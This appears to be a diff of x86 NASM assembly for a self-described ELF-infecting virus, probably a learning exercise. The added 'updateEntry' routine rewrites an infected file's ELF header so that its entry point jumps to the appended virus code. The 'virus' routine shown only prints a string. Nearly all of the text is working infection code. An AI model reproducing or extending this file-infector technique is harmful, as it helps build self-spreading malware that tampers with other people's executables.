@@ -44,6 +44,7 @@ syscall1 6, %1
 %define magic_OFFSET 4
 %define sizeELFfile_OFFSET 4
 %define virus_code_size_OFFSET 8
+%define entry_ptr 0x8048080
 
 %define ENTRY 24
 %define PHDR_start 28
@@ -102,10 +103,7 @@ _start:
 	lea dword edi, [ebp-magic_OFFSET] 	; point to the first free memory in the stack
 	read [ebp-fd_OFFSET], edi, 4
 	mov edi, [edi]
-	;call get_my_loc
-	;sub ecx, next_i-PreviousEntryPoint
-	;mov ecx, edi
-	;write 1, ecx, 5
+;	mov [var], edi
 
 	;go_to_the_end_of_file
 
@@ -142,8 +140,31 @@ _start:
 	cmp eax, 0
 	jl Error
 
+updateEntry:
+    lseek [ebp-fd_OFFSET],0,SEEK_SET
+    mov eax,ebp
+    sub eax,16
+    sub eax,PHDR_size
+    read [ebp-fd_OFFSET], eax, PHDR_size
+    mov eax,entry_ptr
+    add eax, [ebp-16]
+    mov [ebp - PHDR_size - 16 + ENTRY], eax
+    lseek [ebp-8], 0, SEEK_SET
+    mov ecx,ebp
+    sub ecx,PHDR_size+16
+    write [ebp-fd_OFFSET], ecx, 32
+    close [ebp-fd_OFFSET]
+    jmp VirusExit
+
+
 VirusExit: 					; exit virus
 	exit 0
+
+virus:
+    call get_my_loc
+    sub ecx, next_i - OutStr
+    write 1, ecx, 32
+    jmp VirusExit
 
 Error:
 	call get_my_loc
